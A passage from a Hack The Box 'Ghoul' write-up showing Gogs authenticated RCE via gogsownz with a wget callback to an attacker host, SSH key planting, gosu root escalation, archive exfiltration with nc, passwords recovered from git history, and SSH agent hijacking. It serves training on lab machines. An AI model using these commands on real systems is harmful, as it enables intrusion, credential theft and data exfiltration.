<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/ghoul/gogsownz# python3 gogsownz.py -v  http://127.0.0.1:3000/ -C 'AogiriTest':'test@aogiri123' -n i_like_gogits --rce 'wget http://10.10.xx.xx' --cleanup
[i] Starting Gogsownz on: http://127.0.0.1:3000
[+] Loading Gogs homepage
[i] Gogs Version installed: © 2018 Gogs Version: 0.11.66.0916 
[i] The Server is redirecting on the login page. Probably REQUIRE_SIGNIN_VIEW is enabled so you will need an account.
[+] Performing login
[+] Logged in sucessfully as AogiriTest
[+] Got UserID 2
[+] Repository created sucessfully
[i] Exploiting authenticated PrivEsc...
[+] Uploading admin session as repository file
[+] Uploaded successfully.
[+] Committing the Admin session
[+] Committed sucessfully
[+] Removing Repo evidences
[+] Repo removed sucessfully
[i] Signed in as kaneki, is admin True
[i] Current session cookie: '638cb471cd001337'
[+] Got UserID 1
[+] Repository created sucessfully
[+] Setting Git hooks
[+] Git hooks set sucessfully
[+] Fetching last commit...
[+] Got last commit
[+] Triggering the RCE with a new commit
[+] Committed sucessfully
[i] Performed RCE successfully
[i] Waiting 10 seconds before cleaning up...
[+] Removing Repo evidences
[+] Repo removed sucessfully
[i] Done!
root@kali:~/Desktop/HTB/boxes/ghoul/gogsownz# 
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/ghoul# python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
10.10.10.101 - - [04/Oct/2019 16:41:19] "GET / HTTP/1.1" 200 -
</code></pre></div></div>
<p>It worked, time to get a reverse shell :
<br><img src="/images/hackthebox/ghoul/22.png" alt="" class="align-center"><br><br></p>

<h2 id="privilege-escalation-from-git-to-root-getting-aogiri-app7z">Privilege Escalation from git to root, Getting aogiri-app.7z</h2>
<p>Unfortunately python wasn’t installed on the host so I had to get <code class="language-plaintext highlighter-rouge">ssh</code> for a better shell.<br></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cd /home
ls -la
total 8
drwxr-xr-x    1 root     root          4096 Oct  4 14:45 .
drwxr-xr-x    1 root     root          4096 Dec 13  2018 ..
lrwxrwxrwx    1 root     root             9 Oct  4 14:45 git -&gt; /data/git
cd git
ls -la
total 20
drwxr-xr-x    4 git      git           4096 Oct  4 14:45 .
drwxr-xr-x    5 git      git           4096 Dec 13  2018 ..
lrwxrwxrwx    1 git      git              9 Dec 29  2018 .bash_history -&gt; /dev/null
-rw-r--r--    1 git      git             71 Oct  4 14:45 .gitconfig
drwx------    2 git      git           4096 Dec 13  2018 .ssh
drwxr-xr-x    4 git      git           4096 Dec 13  2018 gogs-repositories
cd .ssh
ls -la
total 12
drwx------    2 git      git           4096 Dec 13  2018 .
drwxr-xr-x    4 git      git           4096 Oct  4 14:45 ..
-rw-------    1 git      git             23 Dec 13  2018 environment
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDsiPbWC8feNW7o6emQUk12tFOcucqoS/nnKN/LM3hCtPN8r4by8Ml1IR5DctjeurAmlJtXcn8MqlHCRbR6hZKydDwDzH3mb6M/gCYm4fD9FppbOdG4xMVGODbTTPV/h2Lh3ITRm+xNHYDmWG84rQe++gJImKoREkzsUNqSvQv4rO1RlO6W3rnz1ySPAjZF5sloJ8Rmnk+MK4skfj00Gb2mM0/RNmLC/rhwoUC+Wh0KPkuErg4YlqD8IB7L3N/UaaPjSPrs2EDeTGTTFI9GdcT6LIaS65CkcexWlboQu3DDOM5lfHghHHbGOWX+bh8VHU9JjvfC8hDN74IvBsy120N5 kaneki@kaneki-pc" &gt; authorized_keys
ls -la
total 16
drwx------    2 git      git           4096 Oct  4 14:52 .
drwxr-xr-x    4 git      git           4096 Oct  4 14:45 ..
-rw-r--r--    1 git      git            398 Oct  4 14:52 authorized_keys
-rw-------    1 git      git             23 Dec 13  2018 environment
cat authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDsiPbWC8feNW7o6emQUk12tFOcucqoS/nnKN/LM3hCtPN8r4by8Ml1IR5DctjeurAmlJtXcn8MqlHCRbR6hZKydDwDzH3mb6M/gCYm4fD9FppbOdG4xMVGODbTTPV/h2Lh3ITRm+xNHYDmWG84rQe++gJImKoREkzsUNqSvQv4rO1RlO6W3rnz1ySPAjZF5sloJ8Rmnk+MK4skfj00Gb2mM0/RNmLC/rhwoUC+Wh0KPkuErg4YlqD8IB7L3N/UaaPjSPrs2EDeTGTTFI9GdcT6LIaS65CkcexWlboQu3DDOM5lfHghHHbGOWX+bh8VHU9JjvfC8hDN74IvBsy120N5 kaneki@kaneki-pc
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kaneki_pub@kaneki-pc:~$ ssh -i .ssh/id_rsa git@172.18.0.2
Enter passphrase for key '.ssh/id_rsa': 
Welcome to Alpine!

The Alpine Wiki contains a large amount of how-to guides and general
information about administrating Alpine systems.
See &lt;http://wiki.alpinelinux.org&gt;.

You can setup the system with the command: setup-alpine

You may change this message by editing /etc/motd.

3713ea5e4353:~$ 
</code></pre></div></div>
<p>I couldn’t find anything useful so I had to escalate to root. After some regular enumeration I checked the <code class="language-plaintext highlighter-rouge">suid</code> binaries :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>3713ea5e4353:~$ find / -perm -4000 2&gt;/dev/null
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/chage
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/expiry
/usr/sbin/gosu
/bin/su
3713ea5e4353:~$ 
</code></pre></div></div>
<p><code class="language-plaintext highlighter-rouge">gosu</code> was interesting so I checked it and found that it executes commands as other users even root, so I executed bash as root :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>3713ea5e4353:~$ gosu 
Usage: gosu user-spec command [args]
   ie: gosu tianon bash
       gosu nobody:root bash -c 'whoami &amp;&amp; id'
       gosu 1000:1 id

gosu version: 1.10 (go1.7.1 on linux/amd64; gc)
     license: GPL-3 (full text at https://github.com/tianon/gosu)

3713ea5e4353:~$ gosu root bash
3713ea5e4353:/data/git# whoami
root
3713ea5e4353:/data/git# 
</code></pre></div></div>
<p>I checked the root directory and found a bash script called <code class="language-plaintext highlighter-rouge">session.sh</code> :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>3713ea5e4353:~# ls -la
total 128
drwx------    1 root     root          4096 Dec 29  2018 .
drwxr-xr-x    1 root     root          4096 Dec 13  2018 ..
lrwxrwxrwx    1 root     root             9 Dec 29  2018 .ash_history -&gt; /dev/null
lrwxrwxrwx    1 root     root             9 Dec 29  2018 .bash_history -&gt; /dev/null
-rw-r--r--    1 root     root        117507 Dec 29  2018 aogiri-app.7z
-rwxr-xr-x    1 root     root           179 Dec 16  2018 session.sh
3713ea5e4353:~#
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
<span class="k">while </span><span class="nb">true
</span><span class="k">do
  </span><span class="nb">sleep </span>300
  <span class="nb">rm</span> <span class="nt">-rf</span> /data/gogs/data/sessions
  <span class="nb">sleep </span>2
  curl <span class="nt">-d</span> <span class="s1">'user_name=kaneki&amp;password=12345ILoveTouka!!!'</span> http://172.18.0.2:3000/user/login
<span class="k">done</span>
</code></pre></div></div>
<p>This script was executed periodically to terminate the active sessions,  I saved the password because we may need it later.<br>
The other thing was a <code class="language-plaintext highlighter-rouge">7z</code> archive called <code class="language-plaintext highlighter-rouge">aogiri-app.7z</code>, I used <code class="language-plaintext highlighter-rouge">nc</code> to download it on my box :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>3713ea5e4353:~# nc -w 3 10.10.xx.xx 1338 &lt; aogiri-app.7z
3713ea5e4353:~# md5sum aogiri-app.7z 
88e134a69f8c2f96de31581a52895c07  aogiri-app.7z
3713ea5e4353:~# 
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/ghoul# nc -lp 1338 &gt; aogiri-app.7z
root@kali:~/Desktop/HTB/boxes/ghoul# md5sum aogiri-app.7z
88e134a69f8c2f96de31581a52895c07  aogiri-app.7z
root@kali:~/Desktop/HTB/boxes/ghoul#
</code></pre></div></div>

<h2 id="searching-through-git-commits-privilege-escalation-on-kaneki-pc">Searching Through git Commits, Privilege Escalation on kaneki-pc</h2>
<p>I created a directory and called it <code class="language-plaintext highlighter-rouge">aogiri-app</code> then I extracted the archive there :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/ghoul# mkdir aogiri-app
root@kali:~/Desktop/HTB/boxes/ghoul# cd aogiri-app/
root@kali:~/Desktop/HTB/boxes/ghoul/aogiri-app# cp ../aogiri-app.7z .
root@kali:~/Desktop/HTB/boxes/ghoul/aogiri-app# 7za x ./aogiri-app.7z 

7-Zip (a) [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on)

Scanning the drive for archives:
1 file, 117507 bytes (115 KiB)

Extracting archive: ./aogiri-app.7z
--
Path = ./aogiri-app.7z
Type = 7z
Physical Size = 117507
Headers Size = 4011
Method = LZMA2:192k
Solid = +
Blocks = 1

Everything is Ok

Folders: 114
Files: 125
Size:       154976
Compressed: 117507
root@kali:~/Desktop/HTB/boxes/ghoul/aogiri-app# ls -la
total 128
drwxr-xr-x 3 root root   4096 Oct  4 17:00 .
drwxr-xr-x 4 root root   4096 Oct  4 16:59 ..
-rw-r--r-- 1 root root 117507 Oct  4 17:00 aogiri-app.7z
drwxr-xr-x 5 root root   4096 Dec 29  2018 aogiri-chatapp
root@kali:~/Desktop/HTB/boxes/ghoul/aogiri-app# 
</code></pre></div></div>
<p>By looking at the extracted files we’ll see that it’s a git repository :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/ghoul/aogiri-app/aogiri-chatapp# ls -la
total 52
drwxr-xr-x 5 root root 4096 Dec 29  2018 .
drwxr-xr-x 3 root root 4096 Oct  4 17:00 ..
drwxr-xr-x 8 root root 4096 Dec 29  2018 .git
-rw-r--r-- 1 root root  268 Dec 29  2018 .gitignore
drwxr-xr-x 3 root root 4096 Dec 29  2018 .mvn
-rwxr-xr-x 1 root root 9113 Dec 29  2018 mvnw
-rw-r--r-- 1 root root 5810 Dec 29  2018 mvnw.cmd
-rw-r--r-- 1 root root 2111 Dec 29  2018 pom.xml
-rw-r--r-- 1 root root  124 Dec 29  2018 README.md
drwxr-xr-x 4 root root 4096 Dec 29  2018 src
root@kali:~/Desktop/HTB/boxes/ghoul/aogiri-app/aogiri-chatapp# 
</code></pre></div></div>
<p>And honestly this was a very big rabbit hole, I kept searching through the application code (it was useless and I couldn’t get anything from it) for a long time while it was actually about the <code class="language-plaintext highlighter-rouge">git</code> repository itself.<br>
Let’s check the <code class="language-plaintext highlighter-rouge">reflog</code> to get the commits :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/ghoul/aogiri-app/aogiri-chatapp# git reflog
647c5f1 (HEAD -&gt; master, origin/master) HEAD@{0}: commit: changed service               
b43757d HEAD@{1}: commit: added mysql deps       
b3752e0 HEAD@{2}: reset: moving to b3752e0                                         
0d426b5 HEAD@{3}: reset: moving to 0d426b5                                           
e29ad43 HEAD@{4}: reset: moving to HEAD^                                          
0d426b5 HEAD@{5}: reset: moving to HEAD                                 
0d426b5 HEAD@{6}: reset: moving to origin/master                                        
0d426b5 HEAD@{7}: commit: update dependencies                                          
e29ad43 HEAD@{8}: commit: added service                          
b3752e0 HEAD@{9}: commit: noro stop doing stupid shit
813e0a5 HEAD@{10}: commit: hello world!                              
ed5a88c HEAD@{11}: commit: mysql support                                               
51d2c36 HEAD@{12}: commit: added readme                                    
bec96aa HEAD@{13}: commit: updated dependencies                                        
8b74520 HEAD@{14}: commit (initial): update readme
</code></pre></div></div>
<p>I checked each commit and in one of the commits (<code class="language-plaintext highlighter-rouge">0d426b5</code>) I found some passwords :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/ghoul/aogiri-app/aogiri-chatapp# git show 0d426b5
commit 0d426b533d4f1877f8a114620be8a1294f34ab71
Author: kaneki &lt;kaneki@aogiri.htb&gt;
Date:   Sat Dec 29 11:44:50 2018 +0530

    update dependencies

diff --git a/pom.xml b/pom.xml
index 92f24ee..fc1d313 100644
--- a/pom.xml
+++ b/pom.xml
@@ -48,6 +48,11 @@
             		&lt;artifactId&gt;javax.json&lt;/artifactId&gt;
             		&lt;version&gt;1.0&lt;/version&gt;
 		&lt;/dependency&gt;
+		&lt;dependency&gt;
+              		&lt;groupId&gt;mysql&lt;/groupId&gt;
+            		&lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt;
+            		&lt;version&gt;5.1.46&lt;/version&gt;
+		&lt;/dependency&gt;
 
 	&lt;/dependencies&gt;
 
diff --git a/src/main/resources/application.properties b/src/main/resources/application.properties
index 4cbc10b..41adeb0 100644
--- a/src/main/resources/application.properties
+++ b/src/main/resources/application.properties
@@ -1,7 +1,7 @@
 server.port=8080
 spring.datasource.url=jdbc:mysql://localhost:3306/db
-spring.datasource.username=kaneki
-spring.datasource.password=7^Grc%C\7xEQ?tb4
+spring.datasource.username=root
+spring.datasource.password=g_xEN$ZuWD7hJf2G
 server.address=0.0.0.0
 
 spring.jpa.properties.hibernate.dialect = org.hibernate.dialect.MySQL5InnoDBDialect
</code></pre></div></div>
<p>The only host that hasn’t been rooted yet is <code class="language-plaintext highlighter-rouge">kaneki-pc</code> so I tried the 2 passwords and <code class="language-plaintext highlighter-rouge">7^Grc%C\7xEQ?tb4</code> worked, However still no flag :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kaneki_pub@kaneki-pc:~$ su
Password: 
root@kaneki-pc:/home/kaneki_pub# cd /root/
root@kaneki-pc:~# cat root.txt 
You've done well to come upto here human. But what you seek doesn't lie here. The journey isn't over yet.....
root@kaneki-pc:~# 
</code></pre></div></div>

<h2 id="hijacking-the-ssh-forward-agent-root-flag">Hijacking the SSH Forward Agent, Root Flag</h2>
<p>By checking the <code class="language-plaintext highlighter-rouge">/tmp</code> directory I saw some directories named <code class="language-plaintext highlighter-rouge">ssh-RandomString</code> :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kaneki-pc:~# cd /tmp/
root@kaneki-pc:/tmp# ls -la
total 28
drwxrwxrwt 1 root       root       4096 Oct  4 15:06 .
drwxr-xr-x 1 root       root       4096 Oct  4 14:45 ..
drwx------ 1 root       root       4096 Dec 16  2018 ssh-1Oo5P5JuouKm
drwx------ 1 kaneki_adm kaneki_adm 4096 Dec 16  2018 ssh-FWSgs7xBNwzU
drwx------ 1 kaneki_pub kaneki     4096 Dec 16  2018 ssh-jDhFSu7EeAnz
-rw------- 1 root       root        400 Oct  4 14:45 sshd-stderr---supervisor-E5awkI.log
-rw------- 1 root       root          0 Oct  4 14:45 sshd-stdout---supervisor-3bRi58.log
root@kaneki-pc:/tmp# 
</code></pre></div></div>
<p>And by checking the processes I found that there is a periodic ssh command as root to <code class="language-plaintext highlighter-rouge">172.18.0.1</code> :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kaneki-pc:/tmp# ps aux | grep ssh
root         10  0.0  0.1  72296  6116 pts/0    S    14:45   0:00 /usr/sbin/sshd -D
root         15  0.0  0.1  74656  6536 ?        Ss   14:48   0:00 sshd: kaneki_pub [priv]
kaneki_+     17  0.0  0.0  74792  4008 ?        S    14:48   0:00 sshd: kaneki_pub@pts/2
root        101  0.1  0.1  74656  6572 ?        Ss   15:12   0:00 sshd: kaneki_adm [priv]
kaneki_+    103  0.0  0.0  74656  3192 ?        S    15:12   0:00 sshd: kaneki_adm@pts/1
kaneki_+    104  0.1  0.1  45188  5400 pts/1    Ss+  15:12   0:00 ssh root@172.18.0.1 -p 2222 -t ./log.sh
root        106  0.0  0.0  13212  1020 pts/2    S+   15:12   0:00 grep --color=auto ssh
root@kaneki-pc:/tmp#
</code></pre></div></div>
<p>After searching for a while I found <a href="https://www.clockwork.com/news/2012/09/28/602/ssh_agent_hijacking/" target="_blank" rel="noopener noreferrer">this article</a> which explains it very well. I cleaned the <code class="language-plaintext highlighter-rouge">/tmp</code> directory :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kaneki-pc:/tmp# rm -rf ssh-*
root@kaneki-pc:/tmp# ls -la
total 16
drwxrwxrwt 1 root root 4096 Oct  4 15:13 .
drwxr-xr-x 1 root root 4096 Oct  4 14:45 ..
-rw------- 1 root root  400 Oct  4 14:45 sshd-stderr---supervisor-E5awkI.log
-rw------- 1 root root    0 Oct  4 14:45 sshd-stdout---supervisor-3bRi58.log
root@kaneki-pc:/tmp# 
</code></pre></div></div>
<p>Then I waited for the ssh command to get executed again. After some minutes the agent was created :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kaneki-pc:/tmp# ls -la
total 20
drwxrwxrwt 1 root       root       4096 Oct  4 15:30 .
drwxr-xr-x 1 root       root       4096 Oct  4 14:45 ..
drwx------ 2 kaneki_adm kaneki_adm 4096 Oct  4 15:30 ssh-X2sLvGoeXy
-rw------- 1 root       root        400 Oct  4 14:45 sshd-stderr---supervisor-E5awkI.log
-rw------- 1 root       root          0 Oct  4 14:45 sshd-stdout---supervisor-3bRi58.log
root@kaneki-pc:/tmp# ls -la ssh-X2sLvGoeXy/
total 12
drwx------ 2 kaneki_adm kaneki_adm 4096 Oct  4 15:30 .
drwxrwxrwt 1 root       root       4096 Oct  4 15:30 ..
srwxr-xr-x 1 kaneki_adm kaneki_adm    0 Oct  4 15:30 agent.490
root@kaneki-pc:/tmp# 
</code></pre></div></div>
<p>I quickly hijacked it :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kaneki-pc:/tmp# export SSH_AUTH_SOCK=/tmp/ssh-X2sLvGoeXy/agent.490
root@kaneki-pc:/tmp# ssh-add -l
2048 SHA256:U3NCrv1R4fOSeyIk3W0EcaAm81ETo4dcu5+FBbk3KxE /home/kaneki/.ssh/id_rsa (RSA)
</code></pre></div></div>
<p>Then I could <code class="language-plaintext highlighter-rouge">ssh</code> to <code class="language-plaintext highlighter-rouge">172.18.0.1</code> as root :
<br><img src="/images/hackthebox/ghoul/23.png" alt="" class="align-center"><br><br></p>

<p>And we owned root !
<br>That’s it , Feedback is appreciated !
<br>Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham" target="_blank" rel="noopener noreferrer">@Ahm3d_H3sham</a>
<br>Thanks for reading.<br></p>

<p>Previous Hack The Box write-up : <a href="/hack-the-box/swagshop/">Hack The Box - Swagshop</a>
<br>Next Hack The Box write-up : <a href="/hack-the-box/writeup/">Hack The Box - Writeup</a></p>

        
      </section>

      <footer class="page__meta">
        
        


        

  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2019-10-05T07:00:00+02:00">October 5, 2019</time></p>


      </footer>

      

      
  <nav class="pagination">
    
      <a href="/hack-the-box/swagshop/" class="pagination--pager" title="Hack The Box - Swagshop
">Previous</a>
    
    
      <a href="/hack-the-box/writeup/" class="pagination--pager" title="Hack The Box - Writeup
">Next</a>
    
  </nav>

    </div>

    
  </article>

  
  
</div>
    </div>

    

    <div id="footer" class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
    <ul class="social-icons">
      
  
      
  
      
    </ul>
  </div>
      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>







  <!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-97164925-2"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-97164925-2', { 'anonymize_ip': false});
</script>









  </body>
</html>
